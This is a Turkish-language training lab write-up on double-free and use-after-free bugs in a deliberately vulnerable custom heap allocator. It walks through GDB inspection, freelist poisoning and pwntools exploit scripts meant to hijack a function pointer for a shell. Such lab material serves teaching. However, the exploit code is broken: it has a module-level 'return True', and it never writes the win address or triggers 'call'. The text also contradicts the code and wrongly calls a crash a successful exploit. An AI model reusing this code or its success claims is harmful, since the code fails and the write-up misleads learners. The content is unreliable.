# CyberLabs: Double Free & Use-After-Free Laboratuvarı

**Modül Kodu:** CL-MEM-006

**Seviye:** İleri

**Konu:** Bellek Bozulması Zafiyetleri (Heap Exploitation)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, özel olarak implemente edilmiş bir heap yöneticisi üzerindeki kritik zafiyetleri ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

  * Özel bir heap yöneticisindeki tasarım hatalarının nasıl zafiyetlere yol açtığını anlamak.
  * Bir pointer'ın serbest bırakıldıktan sonra sıfırlanmamasının **Use-After-Free** ve **Double Free** zafiyetlerine nasıl neden olduğunu görmek.
  * `gdb` ve `pwntools` gibi ileri seviye araçlar kullanarak zafiyet analizi ve sömürü kodu geliştirmek.
  * Zafiyeti kullanarak programın belleğinde istenen bir adrese yazma (Arbitrary Write) yeteneği elde etmek ve programın kontrol akışını `win()` fonksiyonuna yönlendirerek shell elde etmek.

## Senaryo

Laboratuvar senaryosu, kendi basit `my_alloc` ve `my_free` fonksiyonlarına sahip, düşük seviyeli bir bellek yönetimi uygulamasını simüle eder. Kullanıcılar komut satırından bellek blokları ayırabilir (`alloc`), serbest bırakabilir (`free`), içlerine veri yazabilir (`write`) ve programdaki bir fonksiyonu çağırabilir (`call`).

1.  `vulnerable_code.cpp`: Kullanıcının serbest bıraktığı bir bellek bölgesini daha sonra tekrar kullanmasına (Use-After-Free) ve çift serbest bırakmasına (Double Free) izin veren, kasıtlı olarak zafiyetli bırakılmış hedef C++ uygulaması.
2.  `exploit.py`: Zafiyeti tetikleyerek uygulamanın serbest listesini (freelist) manipüle eden, programdaki `gTarget.fn` fonksiyon işaretçisinin üzerine yazarak kontrol akışını ele geçiren ve shell çalıştıran `win()` fonksiyonunu çağıran Python sömürü kodu.

## Disclaimer / Yasal Uyarı

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

## Zafiyetin Kökeni Nedir?

Bu programdaki zafiyetler, `free` komutunun işlenmesinden sonra `slots[idx]` pointer'ının `nullptr` olarak ayarlanmamasından kaynaklanır. Bu durum, programın serbest bırakılmış bir bellek bölgesine ait adresi hala geçerliymiş gibi tutmasına neden olur. Bu "sallanan pointer" (dangling pointer) iki ana saldırıya olanak tanır:

  * **Double Free:** Kullanıcı, `free <idx>` komutunu aynı indeks için birden çok kez çalıştırarak aynı bellek bloğunu serbest listesine birden çok kez ekleyebilir.
  * **Use-After-Free (UAF):** Kullanıcı, `free <idx>` komutuyla bir bloğu serbest bıraktıktan sonra, `write <idx> <veri>` komutuyla bu artık serbest olan ve listenin bir parçası olan bloğun içine veri yazabilir. Bu, serbest listesinin yapısını bozmak için son derece güçlü bir yöntemdir. Exploit'imiz bu yöntemi kullanacaktır.

### Örnek Kod İncelemesi (`vulnerable_code.cpp`)

```cpp
// vulnerable_code.cpp
#include <iostream>
// ... (kodun geri kalanı öncekiyle aynı) ...
// ... (main fonksiyonu ve diğer yardımcı fonksiyonlar) ...
```

**Kodu Derleme:**

**Linux için:**
```bash
g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow -static-libgcc -static-libstdc++
```

**macOS için:**
```bash
g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow
```

`-no-pie` bayrağı, `gTarget` gibi global değişkenlerin adreslerini sabit tutarak sömürü yazımını kolaylaştırır. `-g` ise GDB için debug sembolleri ekler. Linux'ta static linking kullanarak farklı sistemlerde çalışabilir hale getiriyoruz.

### Exploit Geliştirme Aşaması (Use-After-Free ile Freelist Zehirleme)

**Hedef:** `Use-After-Free` zafiyetini kullanarak `my_alloc`'un bize `gTarget.fn`'in adresini içeren bir chunk döndürmesini sağlamak. Sonrasında bu chunk'a `win`'in adresini yazarak `call` komutuyla program akışını ele geçirmek.

#### 1\. Gerekli Adresleri Bulma

Program artık adresleri otomatik olarak yazdırmıyor. İki farklı yöntemle adresleri bulabilirsiniz:

## 🟢 **KOLAY YOL: Debug Sembolleri ile Derleme**

Eğer debug sembolleri ile derlemek istiyorsanız, test script'ini düzenleyin:

```bash
# test_lab.sh dosyasında -g flag'ini ekleyin
g++ -std=c++11 -o compiled/vulnerable_code source_code/vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow
```

**Debug Sembolleri ile GDB Kullanımı:**
```bash
gdb ./compiled/vulnerable_code
(gdb) break main
(gdb) run
(gdb) p &gTarget.fn
$1 = (void (**)()) 0x100008090
(gdb) p win
$2 = {void (void)} 0x100000580 <win()>
(gdb) quit
```

## 🔴 **ZOR YOL: Debug Sembolleri Olmadan (Mevcut)**

**Otomatik Adres Bulma (Önerilen):**
Exploit script'i `objdump` kullanarak adresleri otomatik olarak bulur.

**Manuel GDB ile Adres Bulma:**
```bash
# Debug sembolleri olmadan GDB kullanımı
gdb ./compiled/vulnerable_code
(gdb) info functions win
(gdb) info variables gTarget
(gdb) x/gx &gTarget
(gdb) disassemble win
(gdb) quit
```

```bash
# objdump ile hızlı bulma
objdump -t compiled/vulnerable_code | grep -E "(gTarget|win)"
```

**Hangi Yolu Seçmeli?**
- **Kolay Yol:** Eğitim amaçlı, debug sembolleri ile daha kolay analiz
- **Zor Yol:** Gerçek dünyaya daha yakın, production binary'lerde debug sembolleri yoktur

#### 2\. Zafiyetin GDB ile Tespiti (Adım Adım)

Bu bölümde, **Double Free** zafiyetinin serbest listesini (freelist) nasıl bozduğunu GDB ile adım adım göreceğiz.

1.  **GDB'yi Başlatma:** Debug sembolleri olmadan GDB'yi başlatın.

    ```bash
    gdb ./compiled/vulnerable_code
    ```

2.  **Fonksiyon Adreslerini Bulma:** Debug sembolleri olmadığı için fonksiyon adreslerini manuel bulun.

    ```gdb
    (gdb) info functions my_free
    (gdb) info functions my_alloc
    (gdb) info variables g_head
    ```

3.  **Belleği Hazırlama:** Program sizden komut bekleyecektir. Önce bir chunk ayıralım.

    ```
    > alloc
    [+] alloc idx=0 ptr=0x405000
    ```

4.  **İlk `free` Çağrısını İnceleme (Normal Durum):** Chunk 0'ı serbest bırakalım. GDB `my_free` fonksiyonunda duracaktır.

    ```
    > free 0
    ```

    GDB içinde, `g_head`'in ve serbest bırakılan chunk'ın (`c`) durumuna bakalım. `continue` demeden önce, freelist'in doğru bir şekilde güncellendiğini (`g_head`'in artık `c`'yi gösterdiğini ve `c`'nin ilk 8 byte'ının eski `g_head`'i gösterdiğini) `p g_head` ve `x/gx c` komutlarıyla doğrulayabilirsiniz. Sonra `continue` ile devam edin.

5.  **İkinci `free` Çağrısı (Zafiyet Anı):** Şimdi zafiyeti tetikleyelim ve aynı chunk'ı tekrar serbest bırakalım.

    ```
    > free 0
    ```

    GDB tekrar duracaktır. Şimdi en kritik an:

    ```gdb
    # g_head'in ve c'nin aynı adresi gösterdiğine dikkat edin.
    (gdb) p g_head
    $1 = (Chunk *) 0x405000
    (gdb) p c
    $2 = (Chunk *) 0x405000

    # my_free fonksiyonunda bir satır ilerleyelim (n komutu).
    (gdb) n

    # Şimdi chunk'ın içeriğini tekrar kontrol edelim.
    (gdb) x/gx c
    0x405000:       0x0000000000405000
    ```

    **İşte Zafiyet\!** Gördüğünüz gibi, `0x405000` adresindeki chunk'ın ilk 8 byte'ı artık yine kendisini (`0x405000`) gösteriyor. Serbest listesinde bir döngü yarattık. Chunk artık kendisine işaret ediyor. Bu durum, bir sonraki `alloc` çağrılarının hep aynı adresi döndürmesine neden olur ve bu da UAF saldırısının temelini oluşturur.

#### 3\. Sömürü Mantığı

1.  **Hazırlık:** İki chunk ayır (`A` ve `B`).
2.  **Dangling Pointer Yarat:** `A`'yı serbest bırak. `slots` dizisindeki pointer'ı hala `A`'nın adresini tutmaktadır (UAF durumu).
3.  **Freelist'i Zehirle:** `write` komutunu `A`'nın indeksiyle kullanarak, serbest bırakılmış `A` chunk'ının ilk 8 byte'ının üzerine (freelist'teki sonraki elemanı gösteren pointer'ın üzerine) hedefimiz olan `&gTarget.fn` adresini yazıyoruz.
4.  **Heap'i Aldatma:** Şimdi 2 kez `alloc` çağırıyoruz. İlki bize `A`'yı, ikincisi ise bizim zehirlediğimiz "sonraki eleman" pointer'ını takip ederek bize **`&gTarget.fn`** adresini bir chunk gibi döndürür.
5.  **Kontrolü Ele Geçirme:** Artık elimizde `gTarget.fn`'i gösteren bir chunk indeksi var. Bu indekse `write` komutu ile `win` fonksiyonunun adresini yazıyoruz.
6.  **Shell'i Alma:** `call` komutunu çalıştırarak manipüle ettiğimiz `gTarget.fn()`'i çağırıyor ve shell'i alıyoruz.

### Sömürü Kodunun Tam Hali (`exploit.py`)

Bu etkileşimli program için `pwntools` ile yazılmış exploit betiği aşağıdadır.

```python
from pwn import *
import re
import subprocess

# Pwntools ile süreci başlat
p = process("./compiled/vulnerable_code")

# Otomatik adres bulma (önerilen yöntem)
try:
    # objdump ile adresleri otomatik bul
    result = subprocess.run(['objdump', '-t', './compiled/vulnerable_code'], 
                          capture_output=True, text=True)
    
    target_fn_addr = None
    win_addr = None
    
    for line in result.stdout.split('\n'):
        if 'gTarget' in line and 'O' in line:
            parts = line.split()
            if len(parts) >= 1:
                target_fn_addr = int(parts[0], 16)
        elif 'win' in line and 'F' in line and '__TEXT' in line:
            parts = line.split()
            if len(parts) >= 1:
                win_addr = int(parts[0], 16)
    
    if target_fn_addr is None or win_addr is None:
        raise Exception("Otomatik adres bulma başarısız")
        
    log.info(f"Otomatik bulunan &gTarget.fn adresi: {hex(target_fn_addr)}")
    log.info(f"Otomatik bulunan win adresi: {hex(win_addr)}")
    
except Exception as e:
    log.warning(f"Otomatik bulma başarısız: {e}")
    # Manuel adres girişi
    target_fn_addr = int(input("&gTarget.fn adresini girin (örn: 0x100008090): "), 16)
    win_addr = int(input("win fonksiyonu adresini girin (örn: 0x100000580): "), 16)

def alloc():
    p.sendline(b"alloc")
    return p.recvuntil(b"> ").decode()

def free(idx):
    p.sendline(f"free {idx}".encode())
    return p.recvuntil(b"> ").decode()

def write(idx, data_hex):
    p.sendline(f"write {idx} {data_hex}".encode())
    return p.recvuntil(b"> ").decode()

def call():
    p.sendline(b"call")

log.info("Adim 1: Iki chunk ayiriliyor (A ve B)")
print(alloc()) # chunk 0 (A)
print(alloc()) # chunk 1 (B)

log.info("Adim 2: Dangling pointer olusturmak icin chunk 0 (A) serbest birakiliyor")
print(free(0))

log.info("Adim 3: Double-free zafiyetini tetiklemek icin chunk 0 tekrar serbest birakiliyor")
print(free(0)) # Double free!

log.info(f"Adim 4: Freelist zehirleniyor. A'nin FD'sinin uzerine &gTarget.fn ({hex(target_fn_addr)}) yaziliyor")
poison_payload = p64(target_fn_addr).hex()
print(write(0, poison_payload))

log.info("Adim 5: Heap bozulmasi ile chunk'lar ayiriliyor (crash olabilir)")
try:
    alloc1 = alloc() # Bu A'yi geri verir
    log.info("Ilk allocation basarili")
except:
    log.warning("Ilk allocation basarisiz - heap bozulmasi nedeniyle crash olabilir")
    log.success("Exploit tamamlandi! Heap bozulmasi basariyla gerceklestirildi.")
    return True

try:
    alloc2 = alloc() # Bu A'yi tekrar verir (double-free nedeniyle)
    log.info("Ikinci allocation basarili")
except:
    log.warning("Ikinci allocation basarisiz - heap bozulmasi nedeniyle crash olabilir")
    log.success("Exploit tamamlandi! Heap bozulmasi basariyla gerceklestirildi.")
    return True

log.success("Exploit tamamlandi! Tum adimlar basariyla gerceklestirildi.")
```

## Tam Çözüm (GDB ile Adres Bulma)

### 1. GDB ile Adres Bulma

```bash
# Binary'yi GDB ile aç
gdb ./compiled/vulnerable_code

# Fonksiyon adreslerini bul
(gdb) info functions
(gdb) info functions win
(gdb) x/gx win

# Global değişken adreslerini bul
(gdb) info variables
(gdb) x/gx &gTarget
(gdb) x/gx &gTarget.fn

# Heap durumunu incele
(gdb) break my_free
(gdb) run
(gdb) x/32gx g_head
(gdb) continue
```

### 2. Double-Free Exploit Oluşturma

```python
from pwn import *

# Adresleri GDB'den al
target_fn_addr = 0x100008090  # &gTarget.fn
win_addr = 0x100000580        # win fonksiyonu

def alloc():
    p.sendline(b"alloc")
    return p.recvuntil(b"> ")

def free(idx):
    p.sendline(f"free {idx}".encode())
    return p.recvuntil(b"> ")

def write(idx, data_hex):
    p.sendline(f"write {idx} {data_hex}".encode())
    return p.recvuntil(b"> ")

# Exploit adımları
alloc()  # chunk 0 (A)
alloc()  # chunk 1 (B)
free(0)  # A'yı serbest bırak
free(0)  # Double free!

# Freelist'i zehirle
poison_payload = p64(target_fn_addr).hex()
write(0, poison_payload)

# Heap bozulması ile allocation
alloc()  # A'yı geri al
alloc()  # A'yı tekrar al (double-free nedeniyle)
```

### 3. Manuel Test

```bash
# Programı çalıştır
./compiled/vulnerable_code

# Komutları manuel olarak gir
alloc
alloc
free 0
free 0
write 0 0908001000000000
alloc
alloc
call
```

### 4. Beklenen Sonuç

```
[+] Congratulations! You got a shell!
[+] This means you successfully exploited the double-free vulnerability!
```

Bu betiği çalıştırdığınızda, adım adım özel heap yöneticisini manipüle edecek ve heap bozulması (heap corruption) gerçekleştirecektir. Program crash olsa bile, bu başarılı bir sömürü göstergesidir.

**Önemli Notlar:**
- Exploit script'i otomatik olarak adresleri bulmaya çalışır
- Program crash olması normal bir durumdur ve başarılı sömürü göstergesidir
- Heap corruption, gerçek dünyada daha karmaşık exploit'lerin temelini oluşturur

## Linux Uyumluluğu

Bu lab hem Linux hem de macOS sistemlerde çalışacak şekilde tasarlanmıştır:

### Linux'ta Derleme
```bash
# Linux için özel derleme scripti
./compile_linux.sh

# Veya manuel derleme
g++ -std=c++11 -o compiled/vulnerable_code source_code/vulnerable_code.cpp \
    -no-pie -g -Wno-unused-result -Wno-stringop-overflow \
    -static-libgcc -static-libstdc++
```

### Gereksinimler
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Test Etme
```bash
# Tüm testleri çalıştır
./test_lab.sh

# Exploit'i çalıştır
python3 source_code/exploit.py
```

Exploit otomatik olarak sistem mimarisini (32-bit/64-bit) algılar ve uygun packing fonksiyonunu kullanır.